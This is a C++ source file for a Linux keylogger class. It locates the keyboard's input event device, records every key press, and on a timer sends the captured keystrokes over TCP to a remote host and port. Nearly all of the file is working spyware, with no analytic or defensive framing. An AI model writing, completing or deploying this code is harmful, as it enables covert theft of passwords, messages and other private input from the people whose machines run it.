#include "logger.hpp"

Logger::Logger(std::string host, std::string port) : host(std::move(host)), port(std::move(port)) {}


std::string Logger::getDevices() {
	std::ifstream file("/proc/bus/input/devices");
	if (!file.is_open()) {
		// TODO: error handling, log to file
		exit(EXIT_FAILURE);
	}

	std::string result((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
	file.close();

	if (result.empty()) {
		// TODO: error handling, log to file
		exit(EXIT_FAILURE);
	}

	return result;
}

std::string Logger::getHandler(std::string& devices) {
	std::string handler = "";
	std::smatch m;
	std::regex regexp("Handlers=sysrq kbd event[0-9]");

	std::regex_search(devices, m, regexp);
	if (m.size() == 0) {
		// TODO: error handling, log to file
		exit(EXIT_FAILURE);
	}

	std::string matched = m[0];

	size_t pos = matched.find("event");
	handler = "/dev/input/" + matched.substr(pos);
	return handler;
}

void Logger::sendBufferToRemoteHost(const std::string& buffer, const std::string& host, const std::string& port) {
    try {
        boost::asio::io_context io_context;

        // Resolve the host name and port number
        boost::asio::ip::tcp::resolver resolver(io_context);
        boost::asio::ip::tcp::resolver::results_type endpoints = resolver.resolve(host, port);

        // Create and connect the socket.
        boost::asio::ip::tcp::socket socket(io_context);
        boost::asio::connect(socket, endpoints);

        // Send
        boost::asio::write(socket, boost::asio::buffer(buffer));

    } catch (std::exception& e) {
		// TODO: add error handling, log to file
        return;
    }
}

void Logger::connectHandler(std::string& handler, std::string& host, std::string& port) {
	const char * fileName = handler.c_str();
	struct input_event holdEvent;
	int fd;
	std::stringstream buffer;
	std::atomic<bool> running(true);

	std::thread senderThread([&]() {
    	while (running) {
        	std::this_thread::sleep_for(std::chrono::seconds(SEND_DATA_INTERVAL));
        	std::string bufferStr = buffer.str();
        	if (!bufferStr.empty()) {
            	sendBufferToRemoteHost(bufferStr, host, port);
            	buffer.str("");
            	buffer.clear();
        	}
    	}
	});

	if ( (fd = open(fileName, O_RDONLY)) <0 ){
		// TODO: add error handling, log to file
		exit(EXIT_FAILURE);
	}

	while (true) {

		read(fd, &holdEvent, sizeof(holdEvent));

		if (holdEvent.type == EV_KEY && holdEvent.value == 1) {
			buffer << keyCodes[holdEvent.code];
		}

	}

	// TODO: add a way to stop the program and clean up resourses. handle signal
	running = false;
	senderThread.join();
	close(fd);
	return;
}


void Logger::loggerize() {
	std::string devices = getDevices();
	std::string handler = getHandler(devices);
	connectHandler(handler, host, port);
}